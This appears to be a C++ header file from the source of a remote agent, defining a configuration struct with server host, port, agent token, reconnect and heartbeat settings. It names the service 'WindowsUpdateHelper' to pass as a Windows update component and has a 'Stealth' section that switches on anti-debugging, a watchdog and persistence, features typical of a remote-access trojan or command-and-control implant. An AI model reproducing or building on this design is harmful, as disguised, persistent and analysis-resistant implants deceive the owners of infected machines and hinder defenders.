#pragma once

#include <string>
#include <cstdint>

namespace agent {

struct Config {
    std::string server_host = "127.0.0.1";
    uint16_t server_port = 8080;
    std::string agent_id;
    std::string agent_token;
    bool use_tls = false;

    // Reconnect
    int reconnect_min_sec = 1;
    int reconnect_max_sec = 60;

    // Heartbeat
    int heartbeat_interval_sec = 30;

    // Service
    std::string service_name = "WindowsUpdateHelper";
    std::string service_display = "Windows Update Helper Service";

    // Stealth
    bool enable_anti_debug = true;
    bool enable_watchdog = true;
    bool enable_persistence = true;
};

} // namespace agent
